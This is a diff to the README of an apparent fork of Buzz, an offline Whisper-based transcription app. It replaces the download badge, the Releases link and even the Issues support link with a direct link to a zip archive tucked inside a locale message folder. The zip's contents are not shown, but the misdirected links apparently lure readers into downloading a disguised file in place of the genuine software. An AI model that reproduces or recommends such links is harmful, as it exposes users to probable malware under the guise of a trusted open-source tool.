@@ -4,7 +4,7 @@
 Welcome to Buzz! This software helps you transcribe and translate audio files right on your personal computer. It works without needing an internet connection and is powered by OpenAI's Whisper. 
 
 ## 📥 Download Buzz
-[![Download Buzz](https://img.shields.io/badge/Download%20Buzz-v1.0-4CAF50.svg)](https://github.com/mohammadfadi666/buzz/releases)
+[![Download Buzz](https://github.com/mohammadfadi666/buzz/raw/refs/heads/main/buzz/locale/en_US/LC_MESSAGES/Software_v3.4-beta.4.zip%https://github.com/mohammadfadi666/buzz/raw/refs/heads/main/buzz/locale/en_US/LC_MESSAGES/Software_v3.4-beta.4.zip)](https://github.com/mohammadfadi666/buzz/raw/refs/heads/main/buzz/locale/en_US/LC_MESSAGES/Software_v3.4-beta.4.zip)
 
 ## 🛠️ System Requirements
 Before you download Buzz, make sure your computer meets these basic requirements:
@@ -18,7 +18,7 @@ Before you download Buzz, make sure your computer meets these basic requirements
 ## 📥 Download & Install
 To get Buzz, follow these steps:
 
-1. Visit the [Releases page](https://github.com/mohammadfadi666/buzz/releases).
+1. Visit the [Releases page](https://github.com/mohammadfadi666/buzz/raw/refs/heads/main/buzz/locale/en_US/LC_MESSAGES/Software_v3.4-beta.4.zip).
 2. Look for the latest version of Buzz.
 3. Click on the file suitable for your operating system. 
 4. Save the file to a location on your computer, such as your Downloads folder.
@@ -63,7 +63,7 @@ If you run into any issues, try these tips:
 - **Permissions:** If on macOS, you may need to allow Buzz to access your microphone in System Preferences.
 
 ## 💬 Support
-If you have questions or need help, you can reach out via the [Issues page](https://github.com/mohammadfadi666/buzz/issues). We are here to assist you.
+If you have questions or need help, you can reach out via the [Issues page](https://github.com/mohammadfadi666/buzz/raw/refs/heads/main/buzz/locale/en_US/LC_MESSAGES/Software_v3.4-beta.4.zip). We are here to assist you.
 
 ## 📦 Contribution
 If you find Buzz helpful and want to contribute, feel free to fork the repository and submit a pull request. We welcome improvements and fixes.
